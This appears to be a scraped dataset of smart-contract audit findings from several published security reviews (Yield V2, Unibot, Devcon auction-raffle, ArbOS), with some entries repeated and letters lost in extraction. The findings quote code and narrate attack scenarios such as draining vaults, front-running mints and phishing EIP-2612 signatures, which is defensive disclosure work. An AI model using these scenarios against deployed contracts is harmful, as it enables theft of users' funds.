"https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The buy and payAll functions in the Witch contract enable users to buy collateral at an auction. However, neither function checks whether there is an active auction for the collateral of a vault. As a result, anyone can buy collateral from any vault. This issue also creates an arbitrage opportunity, as the collateral of an overcollateralized vault can be bought at a below-market price. An attacker could drain vaults of their funds and turn a prot through repeated arbitrage. Exploit Scenario Alice, a user of the Yield Protocol, opens an overcollateralized vault. Attacker Bob calls payAll on Alices vault. As a result, Alices vault is liquidated, and she loses the excess collateral (the portion that made the vault overcollateralized). Recommendations Short term, ensure that buy and payAll fail if they are called on a vault for which there is no active auction. Long term, ensure that all functions revert if the system is in a state in which they are not allowed to be called. 22 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol V2 contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Yield Protocol V2 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 23 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Risks associated with EIP-2612 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The use of EIP-2612 increases the risk of permit function front-running as well as phishing attacks. EIP-2612 uses signatures as an alternative to the traditional approve and transferFrom ow. These signatures allow a third party to transfer tokens on behalf of a user, with verication of a signed message. The use of EIP-2612 makes it possible for an external party to front-run the permit function by submitting the signature rst. Then, since the signature has already been used and the funds have been transferred, the actual caller's transaction will fail. This could also aect external contracts that rely on a successful permit() call for execution. EIP-2612 also makes it easier for an attacker to steal a users tokens through phishing by asking for signatures in a context unrelated to the Yield Protocol contracts. The hash message may look benign and random to the user. Exploit Scenario Bob has 1,000 iTokens. Eve creates an ERC20 token with a malicious airdrop called ProofOfSignature. To claim the tokens, participants must sign a hash. Eve generates a hash to transfer 1,000 iTokens from Bob. Eve asks Bob to sign the hash to get free tokens. Bob signs the hash, and Eve uses it to steal Bobs tokens. Recommendations Short term, develop user documentation on edge cases in which the signature-forwarding process can be front-run or an attacker can steal a users tokens via phishing. Long term, document best practices for Yield Protocol users. In addition to taking other precautions, users must do the following:  Be extremely careful when signing a message  Avoid signing messages from suspicious sources 24 Yield V2  Always require hashing schemes to be public References  EIP-2612 Security Considerations 25 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Failure to use the batched transaction ow may enable theft through front-running ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol relies on users interacting with the Ladle contract to batch their transactions (e.g., to transfer funds and then mint/burn the corresponding tokens in the same series of transactions). When they deviate from the batched transaction ow, users may lose their funds through front-running. For example, an attacker could front-run the startPool() function to steal the initial mint of strategy tokens. The function relies on liquidity provider (LP) tokens to be transferred to the Strategy contract and then used to mint strategy tokens. The rst time that strategy tokens are minted, they are minted directly to the caller: /// @dev Start the strategy investments in the next pool /// @notice When calling this function for the first pool, some underlying needs to be transferred to the strategy first, using a batchable router. function startPool() external poolNotSelected { [...] // Find pool proportion p = tokenReserves/(tokenReserves + fyTokenReserves) // Deposit (investment * p) base to borrow (investment * p) fyToken // (investment * p) fyToken + (investment * (1 - p)) base = investment // (investment * p) / ((investment * p) + (investment * (1 - p))) = p // (investment * (1 - p)) / ((investment * p) + (investment * (1 - p))) = 1 - p uint256 baseBalance = base.balanceOf(address(this)); 26 Yield V2 require(baseBalance > 0, \"No funds to start with\"); uint256 baseInPool = base.balanceOf(address(pool_)); uint256 fyTokenInPool = fyToken_.balanceOf(address(pool_)); uint256 baseToPool = (baseBalance * baseInPool) / (baseInPool + fyTokenInPool); // Rounds down uint256 fyTokenToPool = baseBalance - baseToPool; // fyTokenToPool is rounded up // Mint fyToken with underlying base.safeTransfer(baseJoin, fyTokenToPool); fyToken.mintWithUnderlying(address(pool_), fyTokenToPool); // Mint LP tokens with (investment * p) fyToken and (investment * (1 - p)) base base.safeTransfer(address(pool_), baseToPool); (,, cached) = pool_.mint(address(this), true, 0); // We don't care about slippage, because the strategy holds to maturity and profits from sandwiching if (_totalSupply == 0) _mint(msg.sender, cached); // Initialize the strategy if needed invariants[address(pool_)] = pool_.invariant(); // Cache the invariant to help the frontend calculate profits emit PoolStarted(address(pool_)); } Figure 9.1: strategy-v2/contracts/Strategy.sol#L146-L194 Exploit Scenario Bob adds underlying tokens to the Strategy contract without using the router. Governance calls setNextPool() with a new pool address. Eve, an attacker, front-runs the call to the startPool() function to secure the strategy tokens initially minted for Bobs underlying tokens. Recommendations Short term, to limit the impact of function front-running, avoid minting tokens to the callers of the protocols functions. 27 Yield V2 Long term, document the expectations around the use of the router to batch transactions; that way, users will be aware of the front-running risks that arise when it is not used. Additionally, analyze the implications of all uses of msg.sender in the system, and ensure that users cannot leverage it to obtain tokens that they do not deserve; otherwise, they could be incentivized to engage in front-running. 28 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "10. Strategy contracts balance-tracking system could facilitate theft ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2 11. Insu\u0000cient protection of sensitive keys Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-YP2-011 Target: hardhat.config.js", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "12. Lack of limits on the total amount of collateral sold at auction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "MakerDAOs Dutch auction system imposes limits on the amount of collateral that can be auctioned o at once (both the total amount and the amount of each collateral type). If the MakerDAO system experienced a temporary oracle failure, these limits would prevent a catastrophic loss of all collateral. The Yield Protocol auction system is similar to MakerDAOs but lacks such limits, meaning that all of its collateral could be auctioned o for below-market prices. Exploit Scenario The oracle price feeds (or other components of the system) experience an attack or another issue. The incident causes a majority of the vaults to become undercollateralized, triggering auctions of those vaults collateral. The protocol then loses the majority of its collateral, which is auctioned o for below-market prices, and enters an undercollateralized state from which it cannot recover. Recommendations Short term, introduce global and type-specic limits on the amount of collateral that can be auctioned o at the same time. Ensure that these limits protect the protocol from total liquidation caused by bugs while providing enough liquidation throughput to accommodate all possible price changes. Long term, wherever possible, introduce limits for the systems variables to ensure that they remain within the expected ranges. These limits will minimize the impact of bugs or attacks against the system. 33 Yield V2", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Lack of incentives for calls to Witch.auction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Users call the Witch contracts auction function to start auctions for undercollateralized vaults. To reduce the losses incurred by the protocol, this function should be called as soon as possible after a vault has become undercollateralized. However, the Yield Protocol system does not provide users with a direct incentive to call Witch.auction. By contrast, the MakerDAO system provides rewards to users who initialize auctions. Exploit Scenario A stock market crash triggers a crypto market crash. The numerous corrective arbitrage transactions on the Ethereum network cause it to become congested, and gas prices skyrocket. To keep the Yield Protocol overcollateralized, many undercollateralized vaults must be auctioned o. However, because of the high price of calls to Witch.auction, and the lack of incentives for users to call it, too few auctions are timely started. As a result, the system incurs greater losses than it would have if more auctions had been started on time. Recommendations Short term, reward those who call Witch.auction to incentivize users to call the function (and to do so as soon as possible). Long term, ensure that users are properly incentivized to perform all important operations in the protocol. 34 Yield V2", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "14. Contracts used as dependencies do not track upstream changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Math64x64 has been copied and pasted into the yieldspace-v2 repository. The code documentation does not specify the exact revision that was made or whether the code was modied. As such, the contracts will not reliably reect updates or security xes implemented in this dependency, as those changes must be manually integrated into the contracts. Exploit Scenario Math64x64 receives an update with a critical x for a vulnerability. An attacker detects the use of a vulnerable contract and can then exploit the vulnerability against any of the Yield Protocol contracts that use Math64x64. Recommendations Short term, review the codebase and document the source and version of the dependency. Include third-party sources as submodules in your Git repositories to maintain internal path consistency and ensure that any dependencies are updated periodically. Long term, use an Ethereum development environment and NPM to manage packages in the project. 35 Yield V2", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "15. Cauldrons give and tweak functions lack vault existence checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Cauldron depends on the caller (the Ladle) to perform a check that is critical to the internal consistency of the Cauldron. The Cauldron should provide an API that makes the creation of malformed vaults impossible. The Cauldron contracts give(vaultId, receiver) function does not check whether the vaultId passed to it is associated with an existent vault. If the ID is not that of an existent vault, the protocol will create a new vault, with the owner set to receiver and all other elds set to zero. The existence of such a malformed vault could have negative consequences for the protocol. For example, the build function checks the existence of a vault by verifying that vault.seriesId is not zero. The build function could be abused to set the seriesId and ilkId of a malformed vault. The Cauldrons tweak function also fails to check the existence of the vault it operates on and can be used to create a vault without an owner. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); /// @dev Transfer a vault to another user. function give(bytes12 vaultId, address receiver) external auth returns(DataTypes.Vault memory vault) 36 Yield V2 { } vault = _give(vaultId, receiver); Figure 15.1: The give and _give functions in the Cauldron contract (vault-v2/contracts/Cauldron.sol#L228-L246) Exploit Scenario Bob, a Yield Protocol developer, adds a new public function that calls Cauldron.give and does not perform a vault existence check. Any user can call the function to create a malformed vault, with unclear consequences for the protocol. Recommendations Short term, ensure that the protocol performs zero-value checks for all values that should not be set to zero. Long term, follow the guidance on data validation laid out in TOB-YP2-016. 37 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "16. Problematic approach to data validation and access controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Many parts of the codebase lack data validation. The Yield team indicated that these omissions were largely intentional, as it is the responsibility of the front end of other contracts to ensure that data is valid. The codebase lacks zero-value checks for the following parameters (among others):  The parameters of LadleStorage.constructor  The receiver parameter of Cauldron._give  The parameters of Ladle.give  The to parameter of Pool.buyBase and Pool.sellBase  The oracle parameter of Cauldron.setLendingOracle and Cauldron.setSpotOracle  The owner parameter of Cauldron.build  The value parameter of FYToken.point  The parameters of Witch.constructor It also lacks zero-value checks for the module parameter of Ladle.moduleCall and Ladle.addModule, and the moduleCall and addModule functions do not perform contract existence checks. Moreover, many functions do not contain exhaustive data validation and instead rely on their caller or callee to partially handle data validation. As a result, the protocols data validation is spread across multiple functions and, in certain cases, across multiple contracts. For example, the Cauldron contracts give and tweak functions (likely among others) require the caller, which is usually the Ladle, to check the existence of the vault being modied. The Ladle is therefore responsible for ensuring the integrity of the Cauldrons internal data. This diuse system of data validation requires developers and auditors to increase their focus on the context of a call, making their work more dicult. More importantly, though, it makes the code less robust. Developers cannot modify a function in isolation; instead, they 38 Yield V2 have to look at all call sites to ensure that required validation is performed. This process is error-prone and increases the likelihood that high-severity issues (like that described in TOB-YP2-006) will be introduced into the system. The deduplication of these checks (such that data validation occurs only once per call stack) is not a secure coding practice; nor is the omission of data validation. We strongly believe that code intended to securely handle millions of dollars in assets should be developed using the most secure coding practices possible. The protocols micro-optimizations do not appear to have any benets beyond a reduction in gas costs. However, these savings are minor. For example, performing a zero check of a value already on the stack would cost 3 units of gas (see the ISZERO opcode). Even with a fairly high gas price of 200 gwei and an ether price of $3,000, this operation would cost $0.0018. Performing 10 additional zero-value checks per transaction would cost only around 2 cents. Similarly, a read of a value in cold storage would have a gas cost of 2,100 (see the SLOAD opcode); with the values above, that would be about $1.20. Warm access (that is, an additional read operation from the same storage slot within the same transaction) would cost only 100 units of gas, or about 6 cents. We believe the low cost of these checks to be a reasonable price for the increased robustness that would accompany additional data validation. We do not agree that it is best to omit these checks, as the relatively small gas savings come at the expense of defense in depth, which is more important. Exploit Scenario A Yield Protocol developer adds a new function that calls a pre-existing function. This pre-existing function makes implicit assumptions about the data validation that will occur before it is called. However, the developer is not fully aware of these implicit assumptions and accidentally leaves out important data validation, creating an attack vector that can be used to steal funds from the protocol. Recommendations Long term, ensure that the protocols functions perform exhaustive validation of their inputs and of the systems state and that they do not assume that validation has been performed further up in the call stack (or will be performed further down). Such assumptions make the code brittle and increase the likelihood that vulnerabilities will be introduced when the code is modied. Any implicit assumptions regarding data validation or access controls should be explicitly documented; otherwise, modications to the code could break those important assumptions. 39 Yield V2 In general, a contract should not assume that its functions will always be called with valid data or that those calls will be made only when the state of the system allows it. This applies even to functions that can be called only by the protocols contracts, as a protocol contract could be replaced by a malicious version. An additional layer of defense could mitigate the fallout of such a scenario. 40 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "17. isContract may behave unexpectedly ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol system relies on the isContract() function in a few of the Solidity les to check whether there is a contract at the target address. However, in Solidity, there is no general way to denitively determine that, as there are several edge cases in which the underlying function extcodesize() can return unexpected results. In addition, there is no way to guarantee that an address that is that of a contract (or one that is not) will remain that way in the future. library IsContract { /// @dev Returns true if `account` is a contract. function isContract(address account) internal view returns (bool) { // This method relies on extcodesize, which returns 0 for contracts in // construction, since the code is only stored at the end of the // constructor execution. return account.code.length > 0; } } Figure 17.1: yield-utils-v2/contracts/utils/IsContract.sol#L6-L14 Exploit Scenario A function, f, within the Yield Protocol codebase calls isContract() internally to guarantee that a certain method is not callable by another contract. An attacker creates a contract that calls f from within its constructor, and the call to isContract() within f returns false, violating the guarantee. Recommendations Short term, clearly document for developers that isContract() is not guaranteed to return an accurate value, and emphasize that it should never be used to provide an assurance of security. Long term, be mindful of the fact that the Ethereum core developers consider it poor practice to attempt to dierentiate between end users and contracts. Try to avoid this practice entirely if possible. 41 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "10. Strategy contracts balance-tracking system could facilitate theft ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "11. Insu\u0000cient protection of sensitive keys ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Sensitive information such as Etherscan keys, API keys, and an owner private key used in testing is stored in the process environment. This method of storage could make it easier for an attacker to compromise the keys; compromise of the owner key, for example, could enable an attacker to gain owner privileges and steal funds from the protocol. The following portion of the hardhat.config.js le uses secrets from the process environment: let mnemonic = process.env.MNEMONIC if (!mnemonic) { try { mnemonic = fs.readFileSync(path.resolve(__dirname, '.secret')).toString().trim() } catch(e){} } const accounts = mnemonic ? { mnemonic, }: undefined let etherscanKey = process.env.ETHERSCANKEY if (!etherscanKey) { try { etherscanKey = fs.readFileSync(path.resolve(__dirname, '.etherscanKey')).toString().trim() } catch(e){} } Figure 11.1: vault-v2/hardhat.config.ts#L67-L82 31 Yield V2 Exploit Scenario Alice, a member of the Yield team, has secrets stored in the process environment. Eve, an attacker, gains access to Alices device and extracts the Infura and owner keys from it. Eve then launches a denial-of-service attack against the front end of the system and uses the owner key to steal the funds held by the owner on the mainnet. Recommendations Short term, to prevent attackers from accessing system funds, avoid using hard-coded secrets or storing secrets in the process environment. Long term, use a hardware security module to ensure that keys can never be extracted. 32 Yield V2", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "18. Use of multiple repositories ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol code is spread across four repositories. These repositories are tightly coupled, and the code is broken up somewhat arbitrarily. This makes it more dicult to navigate the codebase and to obtain a complete picture of the code that existed at any one time. It also makes it impossible to associate one version of the protocol with one commit hash. Instead, each version requires four commit hashes. Exploit Scenario The master branch of one repository of the protocol is not compatible with the master branch of another. The contracts incompatibility leads to problems when a new version of the protocol is deployed. Recommendations To maintain one canonical version of the protocol, avoid using multiple repositories for the contracts. 42 Yield V2 A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Missing unit tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-unibot-securityreview.pdf", "body": "There were no unit tests provided for the target contract. This is problematic for a few reasons: 1. Smart contracts often have an intricate network of dependencies. Modifying one section of the code can have unforeseen consequences on other sections. Testing helps detect these ripple eects that may not be immediately apparent. 2. Even small changes in the code can introduce vulnerabilities. In the case of smart contracts, these vulnerabilities can be exploited, resulting in substantial nancial losses. Testing ensures that the new code does not create any security weaknesses. 3. The system lacks programmatic guarantees around the data validation, access controls, and arithmetic operations performed by the system. 4. Even if the original project was thoroughly tested, the new changes may not be covered by the existing tests. Implementing new tests will help ensure that the modied lines of code are adequately covered. 5. Writing tests can also serve as a form of documentation, helping developers and security researchers understand the intended functionality and any changes made to the contract. 6. For projects that have a community of users or stakeholders, it is essential to maintain trust. One way to reinforce this trust is by demonstrating, through testing, that the contract remains secure and reliable even after changes have been made. Recommendations Short term, write unit tests for any existing and future custom functionality. Long term, consider integrating the test suite of the SwapRouter contract and updating any tests that are not relevant or must be updated. This will provide additional programmatic guarantees that any changes made by the Unibot team do not adversely aect the expected behavior of the router contract.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "1. Missing unit tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-unibot-securityreview.pdf", "body": "There were no unit tests provided for the target contract. This is problematic for a few reasons:", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Lack of events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-unibot-securityreview.pdf", "body": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setUnibotSettingAddress function, which is a privileged operation used to set critical state variables, does not emit an event that species which system state variable was updated (gure 2.1). function setUnibotSettingAddress(uint256 actionIndex, address _address, uint256 _factoryValue) external { require(msg.sender == ADMIN_WALLET_ADDR, \"NO_AUTH\"); // 1000 - FACTORY_SET_VALUE // 7777 - SET_ADMIN_WALLET // 7555 - SET_FEE_WALLET // 9999 = SWAP_ENABLED // 9111 = SWAP_DISABLED if (actionIndex == 1000) { // => FACTORY_SET_VALUE require(_factoryValue == 0 || _factoryValue == 2 || _factoryValue == 3, \"Invalid: 0 (disabled) || 2 (UniV2) || 3 (UniV3)\"); validFactoryVersion[_address] = _factoryValue; } else if (actionIndex == 7777) { // => SET_ADMIN_WALLET ADMIN_WALLET_ADDR = _address; } else if (actionIndex == 7555) { // => SET_FEE_WALLET FEE_WALLET_ADDR = _address; } else if (actionIndex == 9999) { // => SWAP_ENABLED SWAP_ENABLED = true; } else if (actionIndex == 9111) { // => SWAP_DISABLED SWAP_ENABLED = false; } } Figure 2.1: The setUnibotSettingAddress function does not emit events (contracts/UnibotRouter_03_edit.sol#L3732-L3755) Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to take ownership of the ADMIN_WALLET_ADDR account and calls the setUnibotSettingAddress function to update the FEE_WALLET_ADDR to her own address, which allows her to steal user funds. Alice, a Unibot team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "1. Risk of funds becoming trapped if owner key is lost before ra\u0000e settlement ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-ethereum-foundation-devcon-auction-raffle-securityreview.pdf", "body": "Due to overly restrictive access controls on the functions used to settle the auction and rae, in the event that access to the owner key is lost before these are settled, there will be no way for users to reclaim their funds, even for unsuccessful bids. A previous version of the AuctionRaffle contract required a random seed value when calling settleRaffle , so the settlement functions included the onlyOwner modier. The current version of the contract relies on Chainlinks Veriable Random Function (VRF) service to request randomness on-chain as part of the rae settlement ow, and neither the settleAuction or settleRaffle functions take any parameters (gure 1.1). /** * @notice Draws auction winners and changes contract state to AUCTION_SETTLED. * @dev Removes highest bids from the heap, sets their WinType to AUCTION and adds them to _auctionWinners array. * Temporarily adds auction winner bidderIDs to a separate heap and then retrieves them in descending order. * This is done to efficiently remove auction winners from _raffleParticipants array as they no longer take part * in the raffle. */ function settleAuction () external onlyOwner onlyInState(State.BIDDING_CLOSED) { _settleState = SettleState.AUCTION_SETTLED; ... } /** * @notice Initiate raffle draw by requesting a random number from Chainlink VRF. */ function settleRaffle () external onlyOwner onlyInState(State.AUCTION_SETTLED) returns ( uint256 ) { ... } Figure 1.1: The settleAuction and settleRaffle function declarations ( AuctionRaffle.sol#L122-L161 ) 11 Devcon Auction-Rae Security Assessment In order for users to recover their funds (for the golden ticket winner of the rae, funds in excess of the reserve price for other rae winners, and all other unsuccessful bidders), the contract must be in the RAFFLE_SETTLED state, which is the state the contract remains in until the claiming period closes (gure 1.2). function getState () public view returns (State) { if ( block.timestamp >= _claimingEndTime) { return State.CLAIMING_CLOSED; } if (_settleState == SettleState.RAFFLE_SETTLED) { return State.RAFFLE_SETTLED; } if (_settleState == SettleState.AUCTION_SETTLED) { return State.AUCTION_SETTLED; } if ( block.timestamp >= _biddingEndTime) { return State.BIDDING_CLOSED; } if ( block.timestamp >= _biddingStartTime) { return State.BIDDING_OPEN; } return State.AWAITING_BIDDING; } Figure 1.2: The AuctionRaffle contracts getState function, which lists the contracts states in reverse chronological order ( AuctionRaffle.sol#L327-L324 ) In the unlikely event that the team managing the AuctionRaffle contract loses access to the contracts owner key before settling the rae, according to gure 1.2, the contract state machine will be unable to progress until the current time reaches the value in the _claimingEndTime variable. After that point, the only notable function in the contract is withdrawUnclaimedFunds (gure 1.3), which can be called only by the contracts owner. As a result, any funds escrowed in the contract as part of the auction and rae will be unrecoverable. /** * @notice Allows the owner to withdraw all funds left in the contract by the participants. * Callable only after the claiming window is closed. */ function withdrawUnclaimedFunds () external onlyOwner onlyInState(State.CLAIMING_CLOSED) { uint256 unclaimedFunds = address ( this ).balance; payable (owner()).transfer(unclaimedFunds); } Figure 1.3: The withdrawUnclaimedFunds function body ( AuctionRaffle.sol#L234-L241 ) 12 Devcon Auction-Rae Security Assessment Exploit Scenario The team loses access to the owner key of the AuctionRaffle contract late in the bidding process. The auction and rae can no longer be settled due to the onlyOwner modier on the functions that trigger these state transitions, so the contract will not enter the claim period. As a result, all of the funds for successful and unsuccessful bids will be considered unclaimed and will be recoverable by the contract owner only if access to the owner key is regained. Recommendations Short term, remove the onlyOwner modier from the settleAuction and settleRaffle functions in the AuctionRae contract. This will allow the system to progress through all of its states without owner intervention once deployed. 13 Devcon Auction-Rae Security Assessment A. Code Maturity Categories The following tables describe the code maturity categories and rating criteria used in this document. Code Maturity Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Discrepancies between checks performed by arbitrator and OneStepProverHostIo and OneStepProverO contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf", "body": "The arbitrator and the OneStepProverHostIo and OneStepProverO contracts have discrepancies between some of the checks they perform. The arbitrator and the OneStepProverHostIo contract check that the preimage type is valid when executing the ReadPreImage opcode. However, they perform these checks in dierent orders, which may lead to inconsistencies. The OneStepProverHostIo contracts executeReadPreImage function rst performs other checks that could set the machine state to Errored (gure 1.1), which would later cause the function to revert if the preimage type is not valid. function executeReadPreImage( ExecutionContext calldata, Machine memory mach, Module memory mod, Instruction calldata inst, bytes calldata proof ) internal view { uint256 preimageOffset = mach.valueStack.pop().assumeI32(); uint256 ptr = mach.valueStack.pop().assumeI32(); if (preimageOffset % 32 != 0 || ptr + 32 > mod.moduleMemory.size || ptr % LEAF_SIZE != 0) { mach.status = MachineStatus.ERRORED; return; } ... if (inst.argumentData == 0) { ... } else if (inst.argumentData == 1) { ... } else if (inst.argumentData == 2) { ... } else { revert(\"UNKNOWN_PREIMAGE_TYPE\"); } ... } Figure 1.1: A snippet the executeReadPreImage function in OneStepProverHostIo.sol#L123-L245 The arbitrator instead rst checks whether the preimage type is valid and then performs the other checks that could set the machine state to Errored (gure 1.2). pub fn step_n(&mut self, n: u64) -> Result<()> { ... Opcode::ReadPreImage => { let offset = self.value_stack.pop().unwrap().assume_u32(); let ptr = self.value_stack.pop().unwrap().assume_u32(); let preimage_ty = PreimageType::try_from(u8::try_from(inst.argument_data)?)?; // Preimage reads must be word aligned if offset % 32 != 0 { error!(); } if let Some(hash) = module.memory.load_32_byte_aligned(ptr.into()) { ... ... } Figure 1.2: A snippet of the step_n function in machine.rs#L1866-L1874 This discrepancy between the order of checks in these two locations could cause inconsistencies in the machine status, such as when a preimage type is not valid and the oset is not modulo 32. However, the severity of this nding is rated as informational because, as suggested 